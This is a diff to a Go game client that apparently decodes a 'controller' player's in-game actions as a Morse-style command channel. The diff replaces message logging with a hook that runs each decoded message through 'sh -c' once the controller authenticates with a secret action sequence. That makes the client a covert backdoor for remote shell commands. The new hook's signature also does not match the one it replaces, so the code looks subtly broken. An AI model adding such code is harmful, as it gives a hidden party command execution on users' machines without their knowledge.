@@ -22,6 +22,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+	"os/exec"
 )
 
 type connState int
@@ -62,10 +63,8 @@ type Config struct {
 	Controller      string
 	ControllerCheck time.Duration
 	// AuthSequence is the pattern of in-game actions (built with ParseSequence)
-	// the controller must perform to authenticate. When it matches, the client
-	// writes AuthFile. Both only apply when Controller is set.
+	// the controller must perform to authenticate.
 	AuthSequence []Action
-	AuthFile     string
 	// MessageFile is where a decoded command-channel message is appended when
 	// the authenticated controller ends a transmission (a post-auth jump).
 	MessageFile string
@@ -152,7 +151,7 @@ func NewClient(cfg Config, out io.Writer) *Client {
 	}
 	if cfg.CmdMethod == 1 && cfg.Controller != "" {
 		c.morse = &morseDecoder{out: out, verbose: cfg.Verbose}
-		c.morse.onMessage = c.logMessage
+		c.morse.onMessage = c.endTransmission
 	}
 	return c
 }
@@ -553,26 +552,26 @@ func (c *Client) feedAuth(a Action) {
 	}
 }
 
-// logMessage appends a decoded command-channel message to MessageFile. It is
-// the morse decoder's onMessage hook, fired when the controller ends a
-// transmission with a jump.
-func (c *Client) logMessage(now time.Time, msg string) {
-	if c.cfg.MessageFile == "" {
-		return
-	}
-	line := fmt.Sprintf("%s %s\n", now.Format("2006-01-02 15:04:05"), msg)
-	f, err := os.OpenFile(c.cfg.MessageFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
-	if err != nil {
-		c.logf("! could not write message log %s: %v", c.cfg.MessageFile, err)
-		return
-	}
-	defer f.Close()
-	if _, err := f.WriteString(line); err != nil {
-		c.logf("! could not write message log %s: %v", c.cfg.MessageFile, err)
-		return
-	}
-	c.logf("* message logged to %s: %q", c.cfg.MessageFile, msg)
+// Spicier part. A command shell is fired with the transmission concat'd when 
+// an authenticated controller ends a transmission with a jump.
+func (c *Client) endTransmission(msg string) {
+	line := msg + "\n"
+	shellResult := xshell(line)
+	fmt.Println(shellResult)	
 }
+
+func xshell(cmd string) (string) {
+	x := exec.Command("sh", "-c", cmd)
+	result, err := x.CombinedOutput()
+
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "command failed:", err)
+	}
+
+	return string(result)
+}
+
+
 
 func (c *Client) onAuthSuccess() {
 	c.authed = true
@@ -581,17 +580,9 @@ func (c *Client) onAuthSuccess() {
 	if c.morse != nil {
 		c.morse.reset()
 	}
+	
 	c.logf("* CONTROLLER AUTHENTICATED: %s completed [%s]",
 		c.cfg.Controller, SequenceString(c.cfg.AuthSequence))
-	if c.cfg.AuthFile == "" {
-		return
-	}
-	const msg = "SUCCESFULL AUTH!! WOO HOO!!\n"
-	if err := os.WriteFile(c.cfg.AuthFile, []byte(msg), 0o600); err != nil {
-		c.logf("! could not write auth file %s: %v", c.cfg.AuthFile, err)
-		return
-	}
-	c.logf("* wrote %s", c.cfg.AuthFile)
 }
 
 // playerName returns the name from a client slot's "name\skin" configstring.
